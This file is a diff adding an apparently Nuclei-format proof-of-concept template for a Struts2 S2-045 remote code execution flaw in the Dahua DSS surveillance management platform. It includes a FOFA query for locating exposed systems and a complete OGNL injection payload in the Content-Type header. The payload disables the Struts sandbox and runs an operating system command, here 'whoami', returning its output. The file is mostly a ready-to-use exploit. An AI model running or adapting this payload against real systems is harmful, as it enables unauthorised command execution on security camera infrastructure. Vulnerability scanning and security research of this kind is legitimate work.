@@ -1,0 +1,49 @@
+id: poc-cm7nmqvl4q97cugb
+info:
+  name: 大华城市安防监控系统平台管理 DSS Struct2-045
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cm7nmqvl4q97cugb'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cm7nmqvl4q97cugb
+    fofa: body="/portal/include/script/dahuaDefined/headCommon.js?type=index"&&title="DSS"
+http:
+- raw:
+  - 'GET /admin/login_login.action HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Connection: close
+
+
+    Content-Type: %{(#nike=''multipart/form-data'').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[''com.opensymphony.xwork2.ActionContext.container'']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=''whoami'').(#iswin=(@java.lang.System@getProperty(''os.name'').toLowerCase().contains(''win''))).(#cmds=(#iswin?{''cmd.exe'',''/c'',#cmd}:{''/bin/bash'',''-c'',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    root
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
